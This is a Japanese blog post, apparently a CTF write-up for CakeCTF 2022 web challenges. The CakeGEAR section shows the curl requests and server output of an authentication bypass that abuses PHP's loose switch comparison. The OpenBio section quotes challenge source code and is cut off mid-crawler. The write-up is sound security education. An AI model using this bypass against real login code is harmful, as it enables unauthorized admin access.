@@ -1,0 +1,273 @@
+<!doctype html><html><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><title>[CakeCTF 2022] My own writeup - yuasa's blog</title><meta name=viewport content="width=device-width,initial-scale=1"><meta name=description content="CakeCTF 2022が9/3 14:00 - 9/4 14:00(JST)の日程で開催されました. webを解いていたので, そのwriteupを以下に記します.
+[web] CakeGEAR(104 solves) [web] OpenBio(50 solves) [web] CakeGEAR(104 solves) $_SESSION['admin']がtrueになればflagが取れるようです.
+if ($_SESSION['admin'] === true) { $mode = 'admin'; $flag = file_get_contents(&#34;/flag.txt&#34;); } else { $mode = 'guest'; $flag = &#34;***** Access Denied *****&#34;; } usernameをgodmodeまたはadminとしてログインできれば$_SESSION['admin']をtrueにできそうです. adminとしてログインするにはパスワードを推測する必要があるため難しいです.
+switch ($req->username) { case 'godmode': /* No password is required in god mode */ $_SESSION['login'] = true; $_SESSION['admin'] = true; break; case 'admin': /* Secret password is required in admin mode */ if (sha1($req->password) === ADMIN_PASSWORD) { $_SESSION['login'] = true; $_SESSION['admin'] = true; } break; case 'guest': /* Guest mode (low privilege) */ if ($req->password === 'guest') { $_SESSION['login'] = true; $_SESSION['admin'] = false; } break; } usernameをgodmodeとしてログインするには上のswitch文以前で, 接続元のIPアドレスが'127."><meta property="og:image" content><meta property="og:title" content="[CakeCTF 2022] My own writeup"><meta property="og:description" content="CakeCTF 2022が9/3 14:00 - 9/4 14:00(JST)の日程で開催されました. webを解いていたので, そのwriteupを以下に記します.
+[web] CakeGEAR(104 solves) [web] OpenBio(50 solves) [web] CakeGEAR(104 solves) $_SESSION['admin']がtrueになればflagが取れるようです.
+if ($_SESSION['admin'] === true) { $mode = 'admin'; $flag = file_get_contents(&#34;/flag.txt&#34;); } else { $mode = 'guest'; $flag = &#34;***** Access Denied *****&#34;; } usernameをgodmodeまたはadminとしてログインできれば$_SESSION['admin']をtrueにできそうです. adminとしてログインするにはパスワードを推測する必要があるため難しいです.
+switch ($req->username) { case 'godmode': /* No password is required in god mode */ $_SESSION['login'] = true; $_SESSION['admin'] = true; break; case 'admin': /* Secret password is required in admin mode */ if (sha1($req->password) === ADMIN_PASSWORD) { $_SESSION['login'] = true; $_SESSION['admin'] = true; } break; case 'guest': /* Guest mode (low privilege) */ if ($req->password === 'guest') { $_SESSION['login'] = true; $_SESSION['admin'] = false; } break; } usernameをgodmodeとしてログインするには上のswitch文以前で, 接続元のIPアドレスが'127."><meta property="og:type" content="article"><meta property="og:url" content="/posts/24/"><meta property="article:section" content="posts"><meta property="article:published_time" content="2022-09-04T23:11:19+09:00"><meta property="article:modified_time" content="2022-09-04T23:11:19+09:00"><meta name=twitter:card content="summary"><meta name=twitter:title content="[CakeCTF 2022] My own writeup"><meta name=twitter:description content="CakeCTF 2022が9/3 14:00 - 9/4 14:00(JST)の日程で開催されました. webを解いていたので, そのwriteupを以下に記します.
+[web] CakeGEAR(104 solves) [web] OpenBio(50 solves) [web] CakeGEAR(104 solves) $_SESSION['admin']がtrueになればflagが取れるようです.
+if ($_SESSION['admin'] === true) { $mode = 'admin'; $flag = file_get_contents(&#34;/flag.txt&#34;); } else { $mode = 'guest'; $flag = &#34;***** Access Denied *****&#34;; } usernameをgodmodeまたはadminとしてログインできれば$_SESSION['admin']をtrueにできそうです. adminとしてログインするにはパスワードを推測する必要があるため難しいです.
+switch ($req->username) { case 'godmode': /* No password is required in god mode */ $_SESSION['login'] = true; $_SESSION['admin'] = true; break; case 'admin': /* Secret password is required in admin mode */ if (sha1($req->password) === ADMIN_PASSWORD) { $_SESSION['login'] = true; $_SESSION['admin'] = true; } break; case 'guest': /* Guest mode (low privilege) */ if ($req->password === 'guest') { $_SESSION['login'] = true; $_SESSION['admin'] = false; } break; } usernameをgodmodeとしてログインするには上のswitch文以前で, 接続元のIPアドレスが'127."><script src=/js/feather.min.js></script>
+<link href=/css/fonts.2c2227b81b1970a03e760aa2e6121cd01f87c88586803cbb282aa224720a765f.css rel=stylesheet><link rel=stylesheet type=text/css media=screen href=/css/main.ac08a4c9714baa859217f92f051deb58df2938ec352b506df655005dcaf98cc0.css><link id=darkModeStyle rel=stylesheet type=text/css href=/css/dark.726cd11ca6eb7c4f7d48eb420354f814e5c1b94281aaf8fd0511c1319f7f78a4.css media="(prefers-color-scheme: dark)"><link rel=icon type=image/png href=/images/favicon.ico></head><body><div class=content><header><div class=main><a href=/>yuasa's blog</a></div><nav><a href=/>Home</a>
+<a href=/posts>Posts</a>
+<a href=/tags>Tags</a></nav></header><main><article><div class=title><h1 class=title>[CakeCTF 2022] My own writeup</h1><div class=meta>Posted on Sep 4, 2022</div></div><nav id=TableOfContents><ol><li><a href=#web-cakegear104-solves>[web] CakeGEAR(104 solves)</a></li><li><a href=#web-openbio50-solves>[web] OpenBio(50 solves)</a></li><li><a href=#感想>感想</a></li></ol></nav><section class=body><p>CakeCTF 2022が9/3 14:00 - 9/4 14:00(JST)の日程で開催されました. webを解いていたので, そのwriteupを以下に記します.</p><ul><li>[web] CakeGEAR(104 solves)</li><li>[web] OpenBio(50 solves)</li></ul><h1 id=web-cakegear104-solves>[web] CakeGEAR(104 solves)</h1><p><code>$_SESSION['admin']</code>がtrueになればflagが取れるようです.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.php data-lang=:.php><span style=display:flex><span>if ($_SESSION[&#39;admin&#39;] === true) {
+</span></span><span style=display:flex><span>    $mode = &#39;admin&#39;;
+</span></span><span style=display:flex><span>    $flag = file_get_contents(&#34;/flag.txt&#34;);
+</span></span><span style=display:flex><span>} else {
+</span></span><span style=display:flex><span>    $mode = &#39;guest&#39;;
+</span></span><span style=display:flex><span>    $flag = &#34;***** Access Denied *****&#34;;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>usernameを<code>godmode</code>または<code>admin</code>としてログインできれば<code>$_SESSION['admin']</code>を<code>true</code>にできそうです. <code>admin</code>としてログインするにはパスワードを推測する必要があるため難しいです.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.php data-lang=:.php><span style=display:flex><span>switch ($req-&gt;username) {
+</span></span><span style=display:flex><span>    case &#39;godmode&#39;:
+</span></span><span style=display:flex><span>        /* No password is required in god mode */
+</span></span><span style=display:flex><span>        $_SESSION[&#39;login&#39;] = true;
+</span></span><span style=display:flex><span>        $_SESSION[&#39;admin&#39;] = true;
+</span></span><span style=display:flex><span>        break;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    case &#39;admin&#39;:
+</span></span><span style=display:flex><span>        /* Secret password is required in admin mode */
+</span></span><span style=display:flex><span>        if (sha1($req-&gt;password) === ADMIN_PASSWORD) {
+</span></span><span style=display:flex><span>            $_SESSION[&#39;login&#39;] = true;
+</span></span><span style=display:flex><span>            $_SESSION[&#39;admin&#39;] = true;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        break;
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    case &#39;guest&#39;:
+</span></span><span style=display:flex><span>        /* Guest mode (low privilege) */
+</span></span><span style=display:flex><span>        if ($req-&gt;password === &#39;guest&#39;) {
+</span></span><span style=display:flex><span>            $_SESSION[&#39;login&#39;] = true;
+</span></span><span style=display:flex><span>            $_SESSION[&#39;admin&#39;] = false;
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        break;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>usernameを<code>godmode</code>としてログインするには上のswitch文以前で, 接続元のIPアドレスが<code>'127.0.0.1</code>であることが求められます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.php data-lang=:.php><span style=display:flex><span>if ($req-&gt;username === &#39;godmode&#39;
+</span></span><span style=display:flex><span>    <span style=color:#960050;background-color:#1e0010>&amp;&amp;</span> !in_array($_SERVER[&#39;REMOTE_ADDR&#39;], [&#39;127.0.0.1&#39;, &#39;::1&#39;])) {
+</span></span><span style=display:flex><span>    /* Debug mode is not allowed from outside the router */
+</span></span><span style=display:flex><span>    $req-&gt;username = &#39;nobody&#39;;
+</span></span><span style=display:flex><span>}
+</span></span></code></pre></div><p>PHPのswitch/caseが行うのは<a href=https://www.php.net/manual/ja/control-structures.switch.php>緩やかな比較</a>であることを利用します. <a href=https://www.php.net/manual/en/types.comparisons.php>こちら</a>より, 緩やかな比較では任意の文字列と<code>true</code>が等しいです.</p><p>よって, <code>username</code>を<code>true</code>とすることで<code>case 'godmode'</code>の処理を実行することができます.</p><pre tabindex=0><code>$ curl -v -X POST -H &#34;Content-Type: application/json&#34; -d &#39;{&#34;username&#34;:true, &#34;password&#34;:&#34;guest&#34;}&#39; http://web1.2022.cakectf.com:8005/index.php
+...
+*   Trying 34.146.124.175...
+* TCP_NODELAY set
+* Connected to web1.2022.cakectf.com (34.146.124.175) port 8005 (#0)
+&gt; POST /index.php HTTP/1.1
+&gt; Host: web1.2022.cakectf.com:8005
+&gt; User-Agent: curl/7.64.1
+&gt; Accept: */*
+&gt; Content-Type: application/json
+&gt; Content-Length: 55
+&gt; 
+* upload completely sent off: 55 out of 55 bytes
+&lt; HTTP/1.1 200 OK
+&lt; Date: Sat, 03 Sep 2022 11:25:54 GMT
+&lt; Server: Apache/2.4.54 (Debian)
+&lt; X-Powered-By: PHP/8.1.9
+&lt; Set-Cookie: PHPSESSID=8791503537358bf2138bd468967f8550; path=/
+&lt; Expires: Thu, 19 Nov 1981 08:52:00 GMT
+&lt; Cache-Control: no-store, no-cache, must-revalidate
+&lt; Pragma: no-cache
+&lt; Content-Length: 18
+&lt; Content-Type: text/html; charset=UTF-8
+{&#34;status&#34;:&#34;success&#34;}
+...
+
+$ curl -b &#39;PHPSESSID=8791503537358bf2138bd468967f8550&#39; http://web1.2022.cakectf.com:8005/admin.php  
+...
+&lt;!DOCTYPE html&gt;
+&lt;html&gt;
+    &lt;head&gt;
+        &lt;meta charset=&#34;UTF-8&#34;&gt;
+        &lt;title&gt;control panel - CAKEGEAR&lt;/title&gt;
+        &lt;style&gt;table, td { margin: auto; border: 1px solid #000; }&lt;/style&gt;
+    &lt;/head&gt;
+    &lt;body style=&#34;text-align: center;&#34;&gt;
+        &lt;h1&gt;Router Control Panel&lt;/h1&gt;
+        &lt;table&gt;&lt;tbody&gt;
+            &lt;tr&gt;&lt;td&gt;&lt;b&gt;Status&lt;/b&gt;&lt;/td&gt;&lt;td&gt;UP&lt;/td&gt;&lt;/tr&gt;
+            &lt;tr&gt;&lt;td&gt;&lt;b&gt;Router IP&lt;/b&gt;&lt;/td&gt;&lt;td&gt;192.168.1.1&lt;/td&gt;&lt;/tr&gt;
+            &lt;tr&gt;&lt;td&gt;&lt;b&gt;Your IP&lt;/b&gt;&lt;/td&gt;&lt;td&gt;192.168.1.7&lt;/td&gt;&lt;/tr&gt;
+            &lt;tr&gt;&lt;td&gt;&lt;b&gt;Access Mode&lt;/b&gt;&lt;/td&gt;&lt;td&gt;admin&lt;/td&gt;&lt;/tr&gt;
+            &lt;tr&gt;&lt;td&gt;&lt;b&gt;FLAG&lt;/b&gt;&lt;/td&gt;&lt;td&gt;CakeCTF{y0u_mu5t_c4st_2_STRING_b3f0r3_us1ng_sw1tch_1n_PHP}
+&lt;/td&gt;&lt;/tr&gt;
+        &lt;/tbody&gt;&lt;/table&gt;
+    &lt;/body&gt;
+&lt;/html&gt;
+...          
+</code></pre><h1 id=web-openbio50-solves>[web] OpenBio(50 solves)</h1><p>解けませんでした. CSPをbypassしてXSSを実行する問題です.</p><p>APIは以下のようになっています.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.py data-lang=:.py><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Route
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>home</span>():
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> login_ok():
+</span></span><span style=display:flex><span>        conn <span style=color:#f92672>=</span> conn_user()
+</span></span><span style=display:flex><span>        bio <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>hget(flask<span style=color:#f92672>.</span>session[<span style=color:#e6db74>&#39;user&#39;</span>], <span style=color:#e6db74>&#39;bio&#39;</span>)<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> bio <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>            <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>render_template(<span style=color:#e6db74>&#39;index.html&#39;</span>,
+</span></span><span style=display:flex><span>                                         username<span style=color:#f92672>=</span>flask<span style=color:#f92672>.</span>session[<span style=color:#e6db74>&#39;user&#39;</span>], bio<span style=color:#f92672>=</span>bio)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>render_template(<span style=color:#e6db74>&#39;login.html&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/profile/&lt;user&gt;&#39;</span>)
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>profile</span>(user):
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> login_ok():
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>redirect(flask<span style=color:#f92672>.</span>url_for(<span style=color:#e6db74>&#39;home&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    is_report <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>args<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;report&#39;</span>) <span style=color:#f92672>is</span> <span style=color:#f92672>not</span> <span style=color:#66d9ef>None</span>
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    conn <span style=color:#f92672>=</span> conn_user()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> conn<span style=color:#f92672>.</span>exists(user):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>redirect(flask<span style=color:#f92672>.</span>url_for(<span style=color:#e6db74>&#39;home&#39;</span>))
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    bio <span style=color:#f92672>=</span> conn<span style=color:#f92672>.</span>hget(user, <span style=color:#e6db74>&#39;bio&#39;</span>)<span style=color:#f92672>.</span>decode()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> flask<span style=color:#f92672>.</span>render_template(<span style=color:#e6db74>&#39;profile.html&#39;</span>,
+</span></span><span style=display:flex><span>                                 username<span style=color:#f92672>=</span>user, bio<span style=color:#f92672>=</span>bio,
+</span></span><span style=display:flex><span>                                 is_report<span style=color:#f92672>=</span>is_report)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>User API
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/api/user/register&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>user_register</span>():
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Register a new user&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Check username and password</span>
+</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> re<span style=color:#f92672>.</span>match(<span style=color:#e6db74>&#34;^[-a-zA-Z0-9_]{5,20}$&#34;</span>, username) <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> error(<span style=color:#e6db74>&#34;Username must follow regex &#39;^[-a-zA-Z0-9_]{5,20}$&#39;&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> re<span style=color:#f92672>.</span>match(<span style=color:#e6db74>&#34;^.{8,128}$&#34;</span>, password) <span style=color:#f92672>is</span> <span style=color:#66d9ef>None</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> error(<span style=color:#e6db74>&#34;Password must follow regex &#39;^.{8,128}$&#39;&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Register a new user</span>
+</span></span><span style=display:flex><span>    conn <span style=color:#f92672>=</span> conn_user()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> conn<span style=color:#f92672>.</span>exists(username):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> error(<span style=color:#e6db74>&#34;This username has been already taken.&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        conn<span style=color:#f92672>.</span>hset(username, mapping<span style=color:#f92672>=</span>{
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;password&#39;</span>: passhash(password),
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;bio&#39;</span>: <span style=color:#e6db74>&#34;&lt;p&gt;Hello! I&#39;m new to this website.&lt;/p&gt;&#34;</span>
+</span></span><span style=display:flex><span>        })
+</span></span><span style=display:flex><span>        flask<span style=color:#f92672>.</span>session[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>=</span> username
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> success(<span style=color:#e6db74>&#34;Successfully registered a new user.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/api/user/login&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>user_login</span>():
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Login user&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> login_ok():
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> success(<span style=color:#e6db74>&#34;You have already been logged in.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>    password <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;password&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Check password</span>
+</span></span><span style=display:flex><span>    conn <span style=color:#f92672>=</span> conn_user()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> conn<span style=color:#f92672>.</span>hget(username, <span style=color:#e6db74>&#39;password&#39;</span>)<span style=color:#f92672>.</span>decode() <span style=color:#f92672>==</span> passhash(password):
+</span></span><span style=display:flex><span>        flask<span style=color:#f92672>.</span>session[<span style=color:#e6db74>&#39;user&#39;</span>] <span style=color:#f92672>=</span> username
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> success(<span style=color:#e6db74>&#34;Successfully logged in.&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> error(<span style=color:#e6db74>&#34;Invalid password or user does not exist.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/api/user/logout&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>user_logout</span>():
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Logout user&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> login_ok():
+</span></span><span style=display:flex><span>        flask<span style=color:#f92672>.</span>session<span style=color:#f92672>.</span>clear()
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> success(<span style=color:#e6db74>&#34;Successfully logged out.&#34;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>else</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> error(<span style=color:#e6db74>&#34;You are not logged in.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/api/user/update&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>user_update</span>():
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Update user info&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> login_ok():
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> error(<span style=color:#e6db74>&#34;You are not logged in.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>session[<span style=color:#e6db74>&#39;user&#39;</span>]
+</span></span><span style=display:flex><span>    bio <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;bio&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> len(bio) <span style=color:#f92672>&gt;</span> <span style=color:#ae81ff>2000</span>:
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> error(<span style=color:#e6db74>&#34;Bio is too long.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#75715e># Update bio</span>
+</span></span><span style=display:flex><span>    conn <span style=color:#f92672>=</span> conn_user()
+</span></span><span style=display:flex><span>    conn<span style=color:#f92672>.</span>hset(username, <span style=color:#e6db74>&#39;bio&#39;</span>, bio)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> success(<span style=color:#e6db74>&#34;Successfully updated your profile.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>Report spam account
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>&#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span><span style=color:#a6e22e>@app.route</span>(<span style=color:#e6db74>&#39;/api/support/report&#39;</span>, methods<span style=color:#f92672>=</span>[<span style=color:#e6db74>&#39;POST&#39;</span>])
+</span></span><span style=display:flex><span><span style=color:#66d9ef>def</span> <span style=color:#a6e22e>report</span>():
+</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;&#34;&#34;Report spam
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    Support staff will check the reported contents as soon as possible.
+</span></span></span><span style=display:flex><span><span style=color:#e6db74>    &#34;&#34;&#34;</span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> RECAPTCHA_KEY:
+</span></span><span style=display:flex><span>        recaptcha <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;recaptcha&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>        params <span style=color:#f92672>=</span> {
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;secret&#39;</span>: RECAPTCHA_KEY,
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#39;response&#39;</span>: recaptcha
+</span></span><span style=display:flex><span>        }
+</span></span><span style=display:flex><span>        r <span style=color:#f92672>=</span> requests<span style=color:#f92672>.</span>get(
+</span></span><span style=display:flex><span>            <span style=color:#e6db74>&#34;https://www.google.com/recaptcha/api/siteverify&#34;</span>, params<span style=color:#f92672>=</span>params
+</span></span><span style=display:flex><span>        )
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>if</span> json<span style=color:#f92672>.</span>loads(r<span style=color:#f92672>.</span>text)[<span style=color:#e6db74>&#39;success&#39;</span>] <span style=color:#f92672>==</span> <span style=color:#66d9ef>False</span>:
+</span></span><span style=display:flex><span>            abort(<span style=color:#ae81ff>400</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    username <span style=color:#f92672>=</span> flask<span style=color:#f92672>.</span>request<span style=color:#f92672>.</span>form<span style=color:#f92672>.</span>get(<span style=color:#e6db74>&#39;username&#39;</span>, <span style=color:#e6db74>&#39;&#39;</span>)
+</span></span><span style=display:flex><span>    conn <span style=color:#f92672>=</span> conn_user()
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> <span style=color:#f92672>not</span> conn<span style=color:#f92672>.</span>exists(username):
+</span></span><span style=display:flex><span>        <span style=color:#66d9ef>return</span> error(<span style=color:#e6db74>&#34;This user does not exist.&#34;</span>)
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    conn <span style=color:#f92672>=</span> conn_report()
+</span></span><span style=display:flex><span>    conn<span style=color:#f92672>.</span>rpush(<span style=color:#e6db74>&#39;report&#39;</span>, username)
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> success(<span style=color:#e6db74>&#34;&#34;&#34;Thank you for your report.&lt;br&gt;Our support team will check the post as soon as possible.&#34;&#34;&#34;</span>)
+</span></span></code></pre></div><p><code>username</code>を指定してreportを送信すると以下のクローラが走ります. クローラが使用するユーザーのbioにflagが含まれます.</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-:.js data-lang=:.js><span style=display:flex><span><span style=color:#66d9ef>const</span> <span style=color:#a6e22e>crawl</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>async</span> (<span style=color:#a6e22e>target</span>) =&gt; {
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>url</span> <span style=color:#f92672>=</span> <span style=color:#a6e22e>base_url</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;/profile/&#39;</span> <span style=color:#f92672>+</span> <span style=color:#a6e22e>target</span> <span style=color:#f92672>+</span> <span style=color:#e6db74>&#39;?report&#39;</span>;
+</span></span><span style=display:flex><span>    <span style=color:#a6e22e>console</span>.<span style=color:#a6e22e>log</span>(<span style=color:#e6db74>`[+] Crawling: </span><span style=color:#e6db74>${</span><span style=color:#a6e22e>url</span><span style=color:#e6db74>}</span><span style=color:#e6db74>`</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>username</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>random</span>().<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>32</span>).<span style=color:#a6e22e>substring</span>(<span style=color:#ae81ff>2</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>password</span> <span style=color:#f92672>=</span> Math.<span style=color:#a6e22e>random</span>().<span style=color:#a6e22e>toString</span>(<span style=color:#ae81ff>32</span>).<span style=color:#a6e22e>substring</span>(<span style=color:#ae81ff>2</span>);
+</span></span><span style=display:flex><span>
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>const</span> <span style=color:#a6e22e>browser</span> <span style=color:#f92672>=</span> <span style=color:#66d9ef>await</span> <span style=color:#a6e22e>puppeteer</span>.<span style=color:#a6e22e>launch</span>(<span style=color:#a6e22e>browser_option</span>);
+</span></span><span style=display:flex><span>    <span style=color:#66d9ef>try</span> {
